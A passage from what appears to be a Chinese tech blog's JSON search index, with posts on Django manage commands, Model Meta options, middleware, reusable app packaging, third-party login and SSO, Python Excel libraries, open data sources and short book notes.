open(\u0026#39;./command_output\u0026#39;) as f: call_command(\u0026#39;dumpdata\u0026#39;, stdout=f) 4. 定制manage命令 在项目的开发过程中，难免需要一些特殊的处理操作。那么问题来了，如何避免这些重复操作呢？没错，那就是定制自己的manage命令。\nDjango通过django.core.management中的find_commands和get_commands函数查找命令，也就是django.core和每个app的management/commands目录下查找命令。\n知道了原理，那么，只需要在自己的app下，创建如下目录即可。\n1 2 3 app/management/commands/__init__.py app/management/commands/mycommands.py app/managemen/__init__.py 1 2 3 4 5 6 # app/management/commands/mycommands.py from django.core.management.base import BaseCommand, CommandError class Command(BaseCommand): def handle(self, *args, **options): return \u0026#39;hello, mycommands!\u0026#39; 1 2 3 # 执行mycommands命令 manage.py mycommands hello, mycommands! 更详细的写法，可以参考django.core.management.commands中的命令。\n","description":"","id":559,"section":"post","tags":["整理","Django","工具","命令"],"title":"Django 中的 manage 命令","uri":"https://www.chenshaowen.com/blog/manage-command-in-django.html"},{"content":" 通过一个内嵌类“class Meta”给model定义元数据，类似下面这样：\n1 2 3 4 class Foo(models.Model): bar = models.CharField(max_length=30) class Meta: #...... Model元数据就是：不是一个字段的任何数据\n比如排序选项，admin选项等等。\n下面是所有可能用到的 Meta 选项。没有一个选项是必需的。 是否添加 class Meta 到 model 完全是可选的。\napp_label app_label 这个选项只在一种情况下使用，就是你的模型类不在默认的应用程序包下的 models.py 文件中，这时候你需要指定这个模型类是哪个应用程序的。比如在其他地方写了一个模型类，而这个模型类是属于 myapp 的，那么这时需要指定为：\napp_label='myapp'\ndb_table db_table 是用于指定自定义数据库表名的。Django有一套默认的按照一定规则生成数据模型对应的数据库表名，如果你想使用自定义的表名，就通过这个属性指定，比如：\ntable_name='my_owner_table'\n若不提供该参数, Django 会使用 app_label + '_' + module_name 作为表的名字。\n若你的表的名字是一个 SQL 保留字, 或包含 Python 变量名不允许的字符\u0026ndash;特别是连字符 \u0026ndash;没关系. Django 会自动在幕后替你将列名字和表名字用引号引起来。\ndb_tablespace 有些数据库有数据库表空间，比如Oracle。你可以通过db_tablespace来指定这个模型对应的数据库表放在哪个数据库表空间。\nget_latest_by 由于 Django 的管理方法中有个 lastest() 方法，就是得到最近一行记录。如果你的数据模型中有 DateField 或 DateTimeField 类型的字段，你可以通过这个选项来指定lastest()是按照哪个字段进行选取的。\n一个 DateField 或 DateTimeField 字段的名字. 若提供该选项, 该模块将拥有一个 get_latest() 函数以得到 \u0026ldquo;最新的\u0026rdquo; 对象(依据那个字段):\nget_latest_by = \u0026quot;order_date\u0026quot;\nmanaged 由于 Django 会自动根据模型类生成映射的数据库表，如果你不希望 Django 这么做，可以把 managed 的值设置为 False。\n默认值为 True,这个选项为 True 时 Django 可以对数据库表进行 migrate 或 migrations、删除等操作。在这个时间 Django 将管理数据库中表的生命周期\n如果为 False 的时候，不会对数据库表进行创建、删除等操作。可以用于现有表、数据库视图等，其他操作是一样的。\norder_with_respect_to 这个选项一般用于多对多的关系中，它指向一个关联对象。就是说关联对象找到这个对象后它是经过排序的。指定这个属性后你会得到一个 get_XXX_order() 和 set_XXX_order（）的方法,通过它们你可以设置或者回去排序的对象。\n举例来说, 如果一个 PizzaToppping 关联到一个 Pizza 对象, 这样做:\norder_with_respect_to = 'pizza'\n这个字段是告诉Django模型对象返回的记录结果集是按照哪个字段排序的。比如下面的代码：\nordering=['order_date']\n按订单升序排列\nordering=['-order_date']\n按订单降序排列，-表示降序\nordering=['?order_date']\n随机排序，？表示随机\nordering = ['-pub_date', 'author']\n对 pub_date 降序,然后对 author 升序\n需要注意的是:不论你使用了多少个字段排序, admin 只使用第一个字段\npermissions permissions主要是为了在Django Admin管理模块下使用的，如果你设置了这个属性可以让指定的方法权限描述更清晰可读。\n要创建一个对象所需要的额外的权限。 如果一个对象有 admin 设置, 则每个对象的添加,删除和改变权限会人(依据该选项)自动创建。下面这个例子指定了一个附加权限: can_deliver_pizzas:\npermissions = ((\u0026quot;can_deliver_pizzas\u0026quot;, \u0026quot;Can deliver pizzas\u0026quot;),)\n这是一个2-元素 tuple 的tuple或列表, 其中两2-元素 tuple 的格式为: (permission_code, human_readable_permission_name).\nunique_together unique_together 这个选项用于：当你需要通过两个字段保持唯一性时使用。这会在 Django admin 层和数据库层同时做出限制(也就是相关的 UNIQUE 语句会被包括在 CREATE TABLE 语句中)。比如：一个Person的FirstName和LastName两者的组合必须是唯一的，那么需要这样设置：\nunique_together = ((\u0026quot;first_name\u0026quot;, \u0026quot;last_name\u0026quot;),)\nverbose_name verbose_name 的意思很简单，就是给你的模型类起一个更可读的名字：\nverbose_name = \u0026quot;pizza\u0026quot;\n若未提供该选项, Django 则会用一个类名字的 munged 版本来代替: CamelCase becomes camel case.\nverbose_name_plural 这个选项是指定模型的复数形式是什么，比如：\nverbose_name_plural = \u0026quot;stories\u0026quot;\n若未提供该选项, Django 会使用 verbose_name + \u0026ldquo;s\u0026rdquo;.\n","description":"","id":560,"section":"post","tags":["整理","Django","数据库","Model"],"title":"Django Model 中的 Meta 选项","uri":"https://www.chenshaowen.com/blog/django-model-meta.html"},{"content":"1. __init__(self) 在中间件类中， __init__() 方法用于执行系统范围的初始化设置。\n出于性能的考虑，每个已启用的中间件在每个服务器进程中只初始化一次。 也就是说 __init__() 仅在服务进程启动的时候调用，而在针对单个request处理时并不执行。\n对一个middleware而言，定义 __init__() 方法的通常原因是检查自身的必要性。 如果 __init__() 抛出异常 django.core.exceptions.MiddlewareNotUsed,则Django将从middleware栈中移出该middleware。 可以用这个机制来检查middleware依赖的软件是否存在、服务是否运行于调试模式、以及任何其它环境因素。\n在中间件中定义 __init__() 方法时，标准的 self 参数之外，不应定义任何其它参数。\n执行顺序：\nprocess_request 2. process_view 3. process_template_response 4. process_response 5. process_exception 2. process_request 它（process_request）返回 None 或者一个 HttpResponse 对象，如果返回None，Django将会继续处理这个请求， 执行其它的请求中间件。然后执行视图中间件，然后执行视图函数。一旦Django返回HttpResponse对象，它就不会再执行其它的（请求、视图、异常）中间件，也不会再执行对应的视图函数。它将调用响应中间件，然后返回结果。\n3. process_view Django 在调用视图函数前调用 process_view\nrequest 是一个 HttpRequest 对象，view_func 是一个函数对象，而不是函数名字对应的字符串。view_args 和 view_kwargs 是传入的参数（都不包括 request）执行会返回 None 或者 HttpResponse 对象，如果返回None， Django将会继续处理这个请求（request），继续执行其它的 process_view 中间件，然后是匹配的视图函数。一旦返回 HttpResponse 对象，就不会再执行其它的 视图中间件 和 异常中间件，以及对应的视图函数。 它将会继续调用 响应中间件，然后返回。\n4. process_template_response request 是HttpRequest对象，response 是一个 TemplateResponse 对象，或者由视图或其他中间件 产生的等效的对象.在视图执行完毕之后，如果 response 实例包含 render 方法，表明这是一个 TemplateResponse 对象或者等效的对象，process_template_response 中间件就会被调用.它必须返回一个继承有 render 方法的 response 对象，这可能会改变原有的 response 中的 template_name 和 context_data，或者创建一个全新的 TemplateResponse对象（或等效对象）。你不必显示渲染 responses， responses 会在所有 template response 中间件调用结束后自动渲染。\n在生成 response 阶段，所有的中间件都是反向运行的，其中自然包括了 process_template_response。\n5. process_response request 是 HttpRequest 对象，response 是 视图或中间件返回的 HttpResponse或StreamingHttpResponse对象。在返回数据到浏览器之前，process_response 会对所有的 responses进行处理。结果必须返回一个 HttpResponse 或 StreamingHttpResponse 对象，它可能修改已有的对象，也可能创建一个全新的 HttpResponse 或 StreamingHttpResponse 对象。和 process_request 和 process_view 不一样，process_response 总是会被调用的. 即使跳过了 process_request 和 process_view 方法(因为在这之前就生成了HttpResponse) 尤其需要注意的是，你的 process_response 不能依赖 process_request。最后，一点要记住，在response 生成的阶段，中间件是从下往上被调用的，这表示定义在后面的中间件将会被先执行。\n6. process_exception request 是一个 HttpRequest 对象，exception 是一个从视图抛出的异常对象。 当视图抛出异常，Django将会调用 process_exception 中间件，然后返回 None 或者 HttpResponse 对象。 如果返回 HttpResponse 对象，process_template_response 中间件 和 process_response中间件 将会被继续调用。 如果返回None，默认的异常就会被触发。 此外，在 response 逐步形成的阶段，中间件的调用是和加载顺序相反的，包括 process_exception。也就是说，如果某个中间件返回了 response，在这个中间件之上的中间件都不会被调用。\n可以把 django.contrib 看作是可选的 Python 标准库或普遍模式的实际实现。 它们与 Django 捆绑在一起，这样你在开发中就不用“重复发明轮子”了。\n7. 多个Middleware，执行顺序 下面是装配 Middleware1，Middleware2 两个中间件打印出来的日志\n1 2 3 4 5 6 7 8 Middleware1 init Middleware2 init Middleware1 process_request Middleware2 process_request Middleware1 process_view Middleware2 process_view Middleware2 process_response Middleware1 process_response ","description":"","id":561,"section":"post","tags":["整理","Django","Python","中间件"],"title":"Django 中间件","uri":"https://www.chenshaowen.com/blog/django-middleware.html"},{"content":"Django的标准库存放在 django.contrib 包中。每个子包都是一个独立的附加功能包。 这些子包一般是互相独立的，不过有些django.contrib子包需要依赖其他子包\n在 django.contrib 中对函数的类型并没有强制要求 。其中一些包中带有模型（因此需要你在数据库中安装对应的数据表），但其它一些由独立的中间件及模板标签组成。\ndjango.contrib 开发包共有的特性是: 就算你将整个django.contrib开发包删除，你依然可以使用 Django 的基础功能而不会遇到任何问题。 当 Django 开发者向框架增加新功能的时，他们会严格根据这一原则来决定是否把新功能放入django.contrib中。\ndjango.contrib 由以下开发包组成：\nadmin : 自动化的站点管理工具 admindocs:为Django admin站点提供自动文档 auth : Django的用户验证框架 comments : 一个评论应用 contenttypes : 这是一个用于引入文档类型的框架，每个安装的Django模块作为一种独立的文档类型。 csrf : 这个模块用来防御跨站请求伪造(CSRF) databrowse：帮助你浏览数据的Django应用 flatpages : 一个在数据库中管理单一HTML内容的模块 formtools：一些列处理表单通用模式的高级库。 gis：为Django提供GIS（Geographic Information Systems）支持的扩展 humanize : 一系列 Django 模块过滤器，用于增加数据的人性化。 localflavor：针对不同国家和文化的混杂代码段。 markup : 一系列的 Django 模板过滤器，用于实现一些常用标记语言。 redirects : 用来管理重定向的框架。 sessions : Django 的会话框架 sitemaps : 用来生成网站地图的 XML 文件的框架。 sites : 一个让你可以在同一个数据库与 Django 安装中管理多个网站的框架。 syndication : 一个用 RSS 和 Atom 来生成聚合订阅源的的框架。 webdesign：对设计者非常有用的Django扩展。 其他django目录介绍：\nconf。\n主要有两个作用：(1) 处理全局配置, 比如数据库、加载的应用、 MiddleWare等 。(2) 处理urls配置, 就是url与view的映射关系。 core。\nDjango的核心处理库，包括url分析、处理请求、缓存等，其中处理请求是核心了，比如处理fastcgi就是由-\nwsgi.py处理。 db。\n顾名思义，处理与数据库相关的，就是ORM。 dispatch (分派，派遣)\n其实这不是Django原创，是pydispatch库，主要处 理消费者-工作者模式。 forms。\n处理html的表单 middleware。\n中间件，就是处理HTTP的request和response的，类似插件。比如默认的common中间件的一个功能：当一个页面没有找对对应的 pattern时， 会自定加上‘/’重新处理。比如访问/blog时，而定义的pattern是\u0026rsquo;^blog/$\u0026rsquo;， 所以找不到对应的pattern，会自动再用/blog/查找，当然前提是 APPEND_SLASH=True。 template。\nDjango的模板 templatetags。\n处理 Application 的 tag 的 wrapper，就是将 INSTALLED_APPS 中所有的 templatetags 目录添加到 django.templatetags 目录中，则当使用 load blog 记载tag时，就可以使用 import django.templatetags.blog 方式加载了。不过这有一个问题，如果其他 Application目录中也有blog.py， 这会加载第一个出现blog.py的tag。 utils。\n公共库，很多公用的类都在放在这里。 views\n最基本的view方法。 ","description":"","id":562,"section":"post","tags":["Django","整理"],"title":"Django 标准库介绍","uri":"https://www.chenshaowen.com/blog/introduction-of-django-standard-library.html"},{"content":" 笔者所在的小组负责SaaS开发，几乎承载了中心的全部SaaS需求。其中，有长期维护的重点项目，也有短期突击的演示项目，每个人都身兼数职。当然，开发平台也开放给其他人员使用，整个平台有着成百上千的SaaS应用。这些应用中存在大量重复的功能块，重复的开发工作。随着开发平台的建设，部分功能被沉淀到平台组件，笔者希望另一部分也能够复用。一方面可以减轻开发任务，另一方面是有利于功能解耦和维护。由于平台提供的开发框架是Django，本文主要讨论构建可重用Django APP的原则和相关事项。\n1. 可重用应用的原则 设计、构建、测试和维护一个网页应用有许多工作要做。许多的Python和Django项目都有常见的共同问题。可重用将会节省这些重复工作。\n约定结构。Django App本身也只是一个Python包，它特意用于Django项目中。一个可复用的Django App应该具有约定的子模块，比如models、urls、views等模块。约定结构可以显著降低使用成本。 相互隔离。为了唯一标识每个app，Django App名作为ID是个不错的选择。App应该明确自己的url前缀，数据库表名，全局的常、变量名，同时不能相互的依赖。 README。说明文档是每个Django App必须的。文档中要交代，Django App的文件结构、实施细节、依赖关系、可能的风险、甚至联系方式。 2. 项目的文件结构 良好的目录结构，不仅能帮助开发人员更好的归档代码，还能增强构建可重用Django App的意识。\n2.1 Project的目录结构 django_app_template目录。\n创建的django app，一个项目会划分很多个django app，每个app都有独立的django_app_template目录。 common目录。\n存放项目相关的公共函数库，比如上下文处理、装饰器、中间件、工具函数等。 static目录。\n存放静态文件。在部署前，使用collectstatic命令将全部静态文件聚合在一起。 templates目录。\n存放模板文件。 settings.py文件。\n配置项目相关的环境变量、目录、初始化设置等。如果，配置内容较多，还可以将配置单独放在一个config文件夹，根据不同的环境设置不同的settings.py文件，比如config/settings_local.py。 urls.py文件。\n根URL配置，装配的django app，需要在此文件添加url配置。 requirements.txt文件。\n项目的依赖包，包括全部django app中requirements.txt拷贝。 2.2 App的目录结构 static目录。\n静态文件应放在django_app_template子目录下，避免与其他app发生冲突。 templates目录。\n模板文件应放在django_app_template子目录下，避免与其他app发生冲突。 admin.py文件。\n用于admin页面的显示和定制化 constants.py文件。\n用于存放常量 feeds.py文件。\n用于输出rss forms.py文件。\n用于验证前端的数据 middleware.py文件。\ndjango app中用到的中间件 settings.py文件。\ndjango app中相关的配置 utils.py文件。\ndjango app中使用到的工具函数 README文件。\n用于描述django app的相关说明信息 requirements.txt文件。\n用于记录django app的相关依赖 tests.py文件。\n用于写django app的测试用例。 3. 如何打包你的应用 3.1 准备相关文件 创建父目录django-app-template。将整个django_app_template拷贝到这个目录，django-app-template/django_app_template。 创建django-app-template/README.rst文件，撰写打包应用的配置、安装、使用过程。 创建django-app-template/requirements.txt文件，依赖的包。 创建django-app-template/LICENSE文件，许可协议。 创建django-app-template/setup.py文件。 如果需要包含其他文件，还需要配置django-app-template/MANIFEST.in文件\n1 2 3 4 include LICENSE include README.rst include requirements.txt exclude build.sh 3.2 编写打包配置 编写django-app-template/setup.py。更详细的使用可以查阅setuptools相关手册。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 # -*- coding: utf-8 -*- import os from setuptools import find_packages, setup from pip.req import parse_requirements install_reqs = parse_requirements(\u0026#39;requirements.txt\u0026#39;, session=\u0026#39;hack\u0026#39;) # reqs is a list of requirement # e.g. [\u0026#39;django==1.5.1\u0026#39;, \u0026#39;mezzanine==1.4.6\u0026#39;] reqs = [str(ir.req) for ir in install_reqs] with open(os.path.join(os.path.dirname(__file__), \u0026#39;README.rst\u0026#39;)) as readme: README = readme.read() # allow setup.py to be run from any path os.chdir(os.path.normpath(os.path.join(os.path.abspath(__file__), os.pardir))) setup( name=\u0026#39;django-app-template\u0026#39;, version=\u0026#39;0.0.1\u0026#39;, author=\u0026#39;\u0026#39;, author_email=\u0026#39;@gmail.com\u0026#39;, description=\u0026#39;django-app-template\u0026#39;, long_description=README, keywords=\u0026#39;django app\u0026#39;, license=\u0026#39;BSD License\u0026#39;, url=\u0026#39;http://django-app-template.com/\u0026#39;, packages=find_packages(exclude=[]), include_package_data=True, zip_safe=False, install_requires=reqs, classifiers=[ \u0026#39;Environment :: Web Environment\u0026#39;, \u0026#39;Framework :: Django\u0026#39;, \u0026#39;Framework :: Django :: 1.8\u0026#39;, \u0026#39;Intended Audience :: Developers\u0026#39;, \u0026#39;License :: OSI Approved :: BSD License\u0026#39;, \u0026#39;Operating System :: OS Independent\u0026#39;, \u0026#39;Programming Language :: Python\u0026#39;, \u0026#39;Programming Language :: Python :: 2\u0026#39;, \u0026#39;Programming Language :: Python :: 2.7\u0026#39;, \u0026#39;Topic :: Internet :: WWW/HTTP\u0026#39;, \u0026#39;Topic :: Internet :: WWW/HTTP :: Dynamic Content\u0026#39;, ], ) 3.3 执行打包命令 使用python setup sdist创建一个新包。\n1 python setup sdist 3.4 测试安装 安装\n1 pip install djangp-app-template/dist/djangp-app-template-0.0.1.tar.gz 卸载\n1 pip uninstall djangp-app-template 4. 参考 https://djangopackages.org/ http://python.usyiyi.cn/django/intro/reusable-apps.html https://django-intro-zh.readthedocs.io/zh_CN/latest/reusable_app/ ","description":"","id":563,"section":"post","tags":["Django","管理","博文"],"title":"构建可重用的Django App","uri":"https://www.chenshaowen.com/blog/how-to-build-reusable-django-app.html"},{"content":"副标题: 核心原理与案例分析\n作者: 李智慧\n出版社: 电子工业出版社\n出版年: 2013-9-1\nISBN: 9787121212000\nNotes:\n没有业务对技术的需求，培养不出优秀的架构师。\n作者是伴随着淘宝业务增长，一起成长起来的。\n书中主要从系统性能，可用性，伸缩性，扩展性，安全性几个方面阐述网站架构技术要点。\n同时，结合淘宝、维基百科等架构案例，分析技术挑战、应对策略。\n最后，还给迷茫的架构师指明了成长之路。\n内容上，高屋建瓴，非常适合开发人员看。\n对于书中提到的一些场景，如果没有遇到过，可能很难与作者有所共鸣。\n这是一本常看常新、每有所得的书。\n","description":"","id":564,"section":"post","tags":["书籍","架构","设计"],"title":"大型网站技术架构","uri":"https://www.chenshaowen.com/blog/book/large-web-technology-architecture.html"},{"content":" 登录的会话机制: http 是无状态协议，浏览器的每次请求都是相互独立。但并不是每次 http 请求都与状态无关，为此，浏览器和服务器需要共同维护一个状态，这就是会话机制。一种方法是，浏览器第一次向服务器发起请求，服务器会将浏览器返回 sessionID，后续浏览器的每次请求都会带上 sessionID 以验证同一用户。还有一种方法是，服务器通过发放 token，用于用户认证、App授权。本文主要介绍两种常见的登录方式：第三方登录和单点登录(SSO)。\n1. 第三方登录 用户（一方）利用已有账号（第三方）快速完成登录注册其他网络服务（另一方），称之为第三方登录。提供ID的服务称之为，IdP（Identifier Provider，身份提供商）。提供其他服务的称之为 SP（Service Provider，服务提供商）。\n1.1 优缺点 优点：\n减少用户注册成本 维持已有的用户关系 降低开发和维护成本 缺点：\n不利于营销信息的传达，无法获取到用户手机、邮箱等信息。\n1.2 使用场景 适用于工具、内容提供的应用。\n1.3 实现方案 OAuth2.0\n2. 单点登录 用户只需要登录一次就可以访问所有相互信任的应用系统。 它包括可以将这次主要的登录映射到其他应用中用于同一个用户的登录的机制，是目前比较流行的企业业务整合的解决方案之一。\n2.1 优缺点 优点：\n统一的用户信息中心 减少了子系统开发登录工作 缺点：\n难重构 安全风险。已登录账户，可以随意登录其他站点。 容易被选为攻击对象。 2.2 使用场景 适用于具有多站点的大企业，特别是公司内部系统复杂多样的系统。\n2.3 实现方案 共享Cookie：\n子系统都在一个父级域名下时，将 Cookie 种在父域下，通过 Cookie 获取 SessionID。子系统域名有限制。这种方式，其实可以看做是共享 session。\nToken 验证：\n子系统需要登录时，引导至 SSO 页面登录，下发 token，子系统通过 token，调用 SSO 获取用户信息。\n3. 参考 https://www.ibm.com/developerworks/cn/web/wa-singlesign/ https://www.itlipeng.cn/?p=767 ","description":"","id":565,"section":"post","tags":["安全","DevOps","博文"],"title":"第三方登录和单点登录简介","uri":"https://www.chenshaowen.com/blog/third-party-login-and-single-sign-on.html"},{"content":"副标题: 生活、工作与思维的大变革\n作者: [英] 维克托·迈尔·舍恩伯格\n出版社: 浙江人民出版社\n出版年: 2012-12\nISBN: 9787213052545\n","description":"","id":566,"section":"post","tags":["书籍","数据"],"title":"大数据时代","uri":"https://www.chenshaowen.com/blog/book/the-big-data.html"},{"content":" Python、Excel常用于数据处理，难免会产生相互的数据传递、计算处理。本文主要介绍Python-Excel系列的库，以及xlrd和xlwt两个库是使用。\n1. 常用库 xlwings，openpyxl，pandas，win32com，xlsxwriter，DataNitro，xlutils\n2. 环境要求 xlutils 仅支持 xls 文件，即2003以下版本 win32com 与 DataNitro 仅支持 windows 系统 xlwings 安装成功后，如果运行提示报错“ImportError: no module named win32api”，请再安装 pypiwin32 或者 pywin32 包 win32com 不是独立的扩展库，而是集成在其他库中，安装 pypiwin32 或者 pywin32 包即可使用 DataNitro 是 Excel 的插件，安装需到官网下载 3. 文档读写修改能力 xlsxwriter 不支持打开或修改现有文件 xlwings 不支持对新建文件的命名 DataNitro 作为 Excel 插件需依托于软件本身 pandas 新建文档需要依赖其他库等等 4. 基本功能 xlwings\n可结合 VBA 实现对 Excel 编程，强大的数据输入分析能力，同时拥有丰富的接口，结合 pandas/numpy/matplotlib 轻松应对 Excel 数据处理工作。 openpyxl\n简单易用，功能广泛，单元格格式/图片/表格/公式/筛选/批注/文件保护等等功能应有尽有，图表功能是其一大亮点，缺点是对 VBA 支持的不够好。 pandas\n数据处理是 pandas 的立身之本，Excel 作为 pandas 输入/输出数据的容器。 win32com\n从命名上就可以看出，这是一个处理 windows 应用的扩展，Excel 只是该库能实现的一小部分功能。该库还支持 office 的众多操作。需要注意的是，该库不单独存在，可通过安装 pypiwin32 或者 pywin32 获取。 xlsxwriter\n拥有丰富的特性，支持图片/表格/图表/筛选/格式/公式等，功能与openpyxl相似，优点是相比 openpyxl 还支持 VBA 文件导入，迷你图等功能，缺点是不能打开/修改已有文件，意味着使用 xlsxwriter 需要从零开始。 DataNitro\n作为插件内嵌到 Excel 中，可完全替代 VBA，在 Excel 中使用 python 脚本。既然被称为 Excel 中的 python，协同其他 python 库亦是小事一桩。然而，这是付费插件\u0026hellip; xlutils\n基于 xlrd/xlwt，老牌 python 包，算是该领域的先驱，功能特点中规中矩，比较大的缺点是仅支持 xls 文件 5. 性能 分别使用不同库进行添加及读取 1000行 * 700列 数据操作，得到所用时间，重复操作取平均值\n6. 库选择建议 不想使用 GUI 而又希望赋予 Excel 更多的功能，openpyxl 与 xlsxwriter，你可二者选其一 需要进行科学计算，处理大量数据，建议 pandas+xlsxwriter 或者 pandas+openpyxl； 想要写 Excel 脚本，会 Python 但不会 VBA ，可考虑 xlwings 或 DataNitro； 7. 使用xlrd、xlwt读写excel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 # coding=utf-8 def list_wirte_to_excel(data_list): \u0026#39;\u0026#39;\u0026#39; :param data_list = [(1, 2, 3),(11, 21, 31)]: \u0026#39;\u0026#39;\u0026#39; import xlwt excel = xlwt.Workbook(encoding=\u0026#39;utf-8\u0026#39;) sheet1 = excel.add_sheet(u\u0026#39;sheet1\u0026#39;, cell_overwrite_ok=True) # 创建sheet1 columns = [u\u0026#39;第一列\u0026#39;, u\u0026#39;第二列\u0026#39;, u\u0026#39;时间\u0026#39;] # 创建列名栏 for i in xrange(0, len(columns)): sheet1.write(0, i, columns[i]) # 写入数据 for i in xrange(0, len(data_list)): if len(data_list[i]) == len(columns): # write(行，列，数据，样式) sheet1.write(i + 1, 0, data_list[i][0]) sheet1.write(i + 1, 1, data_list[i][1]) sheet1.write(i + 1, 2, data_list[i][2]) excel.save(\u0026#39;excel.xls\u0026#39;) def excel_to_list(excel_path): \u0026#39;\u0026#39;\u0026#39; :param excel_path 能访问的excel路径: :return包含全部数据的list:[(第一列数据), (第二列数据)] \u0026#39;\u0026#39;\u0026#39; import xlrd wb = xlrd.open_workbook(excel_path) # 两种方式：索引和名字 sheet = wb.sheet_by_index(0) data = [sheet.row_values(rownum) for rownum in xrange(sheet.nrows)] # 如果只想返回第一列数据： # sheet.col_values(0) # 通过索引读取数据 # cell(行,列), 获取第一行，第一列数据 # sheet.cell(0, 0).value return data[1:] if __name__ == \u0026#39;__main__\u0026#39;: import random import datetime data = [(random.randint(0, 1000), random.randint(0, 1000), datetime.datetime.now().strftime(\u0026#39;%Y-%m\u0026#39;)) for i in xrange(1000)] list_wirte_to_excel(data) print excel_to_list(\u0026#39;./excel.xls\u0026#39;) ","description":"","id":567,"section":"post","tags":["博文","Demo","Python","数据"],"title":"Python读写Excel","uri":"https://www.chenshaowen.com/blog/using-python-read-and-write-excel-data.html"},{"content":"1. 经济 世界银行\nGapminder\n世界卫生组织和世界银行覆盖经济、医疗和社会统计数据\n美国中央情报局,世界概况\n包含267个国家的历史信息、人口、经济、政府、基设施和军事等信息\n中国统计局最新宏观经济数据\n工业和信息化部较多数据在此发布，尤其是有关工业运行及信息化相关数据\n中国人民银行中国金融市场政策及运行相关数据\n中国银监会银行金融相关数据\n中国海关中国进出口相关数据\n中国国家知识产权局专利相关查询\n中国证监会相关政策及招股书披露平台，以及拟上市公司排队每周披露\n上海证券交易所\n深圳证券交易所\n全国中小企业股份转让系统（新三板）新三板挂牌公司的转让及信息披露\n香港证券交易所\n上海市政府数据服务网集中发布政府部门及第三方机构的数据产品以及数据应用，数据将涉及经济、教育、卫生、交通、地理、法 律、规划等。\n上海公共研发平台可以注册，人工审核，内包含较多数据库\n中国经济数据库提供有关世界发达经济和发展中经济的最广泛、最精确的信息。\n中国经济信息网\n行业研究报告，宏观数据较全。中国经济信息网简称中经网，是国家信息中心组建的、以提供经济信息为主要业务的专业性信息服务网络\n2. 金融 万德数据库\n优势：（1）数据表结构还是比较科学，而且还有很多不同工具，例如WACC计算小插件、贝塔计算小插件、另外还有直接在EXCEL估值的模版。 （2）用户体现非常好，界面体验一流，符合中国人的使用习惯。 （3）特色数据库有中国A\\B股数据、基金数据、债券数据和期货数据都非常突出。 （4）资讯内容结构严重模仿BLOOMBERG （5）支持API插件 缺点 （1）其实我想突出数据质量只是一般，有一些还是很多错误、例如指数的数据库的错误和雅虎Finance几乎是一样的。 （2）世界指数等国际数据库还是一般。 （3）主要是提供资讯，下单通道没有Bloomberg没有那么强大。 （4）行业数据严重缺乏，而且质量真的不太好。\n恒生聚缘 优点：（1）界面设计虽然没有万德那么花哨，但是非常实在，非常实用，而且很方便。数据结构也科学，不会出现过多冗余的状况。 （2）价格比万德便宜，但是性价比挺高的。 （3）A\\B股数据是强项 （4）研究报告更新速度比较快，比较全面、质量比万德好。 （5）数据质量过硬。\nCSMAR数据库优点 （1）公司金融数据是强项，非常强大和齐全，我经常使用哈哈。 （2）数据库做学术还是比较全面的。年份比较早的数据都会有收录。 （3）高频数据是全国第二好。 （4）公司治理数据比较好，详细，包括公司控制链图均有收录。 缺点： （1）由于是学术数据库关系，更新速度不够快。机构是绝对不会使用的。 （2）数据结构有些设计是有问题。 （3）缺乏资讯类的数据。 （4）行业数据是更新速度是所有数据库中最慢的，建议不要使用行业数据库。\n巨潮数据库优点：（1）交易所的公告、董事会决议总是最快可以知道。 （2）异动数据库中的异动记录肯定不止前十名，获取还能看到前15名，哈哈！ 缺点 （1）数据结构太老的了，严重有问题，见过5个字段来做表主键的，无语。 （2）好像异动数据库，把所有的债券、股票、衍生证、涡轮全部放在一起，结果有一次踩地雷，把债券和股票都提了出来，原因是股票的代码=债券的代码，真的囧死了。 （3）异动数据中的计算方法严重不正确，如果你查阅交易所对涨跌幅偏离值的计算方法，你会发现在2006年8月4日前后会非常不同。结果又一次让我踩到地雷。 （4）数据质量一般，算不上好。\n清科数据库清科研究数据库包含风险投资,私募股权,创业者相关投资,私募,并购,上市数据库,范围涉及投资机构,企业,投资人物相关TMT、传统行业、清洁技术、生技健康等行业市场事件用的比较少，专做Pe,风险投资数据的。\n3. 自然 国家气候数据中心\n巨大的环境、气象和气候数据集来自美国国家气候数据中心。世界上最大的气象数据的归档。\nOpenStreetMap\n全球范围的免费地图数据，每周动态更新\n环境云通过获取权威数据源(中国气象网、中央气象台、国家环保部数据中心、美国全球地震信息中心等等)所发布的各类环境数据，以及云创自主布建的各类全国性环境监控传感器网络。\n4. 趋势 谷歌趋势统计搜索量(搜索)总额的比例对于任何给定的期限,自2004年以来\n百度指数\n阿里指数\n艾瑞咨询\n5. 公共 亚马逊网络服务公共数据集巨大的公共数据资源,包括1000基因组计划,试图构建人类遗传信息的最全面的数据库和NASA的地球的卫星图像的数据库\nFacebook Graph虽然大部分的信息用户的Facebook的个人资料是私人的,很多不是——Facebook提供图形API的方式查询大量的信息,其用户乐于分享与世界(或无法隐藏,因为他们没有了隐私设置工作\nDBPedia维基百科是由数百万块的数据,在每个主题在阳光下结构化和非结构化。DBPedia是一个雄心勃勃的项目目录,并创建一个公共、自由可分配的数据库允许任何人来分析这些数据\n谷歌开放数据库community-compiled数据库结构化数据的人,地方和事情,与超过4500万个条目\n中国国家图书馆\nFigshare研究成果共享平台，在这里你会发现来自世界的大牛们的研究成果分享，同时get其中的研究数据，内容很有启发性。\n企信网快速查询企业工商信息、法院判决信息、关联企业信息、司法拍卖信息、失信信息、被执行人信息、知识产权信息、公司新闻、招聘信息等服务。\n八爪鱼简单实用的采集器，功能齐全，操作简单，不用写规则。特有的云采集，关机也可以在云服务器上运行采集任务。\n集搜客一款简单易用的网页信息抓取软件，能够抓取网页文字、图表、超链接等多种网页元素，提供好用的网页抓取软件、数据挖掘攻略、行业资讯和前沿科技等。\nHaoservice API数据接口,提供准确、全面、快捷的一站式数据服务平台，是北京畅游互联旗下数据平台。\n图像识别开放平台 API数据接口\n天狗云 API数据接口,健康、医疗、生活、农业开放平台)\n极速数据API数据接口\n百度API商店API数据接口\n聚合数据 API数据接口,开发者数据定制,费数据调用\n","description":"","id":568,"section":"post","tags":["数据","Collect","整理"],"title":"免费开放数据源","uri":"https://www.chenshaowen.com/blog/collect-free-open-data-source.html"},{"content":"作者: 威廉·萨默塞特·毛姆\n出版社: 天津人民出版社\n出版年: 2016-1-20\nISBN: 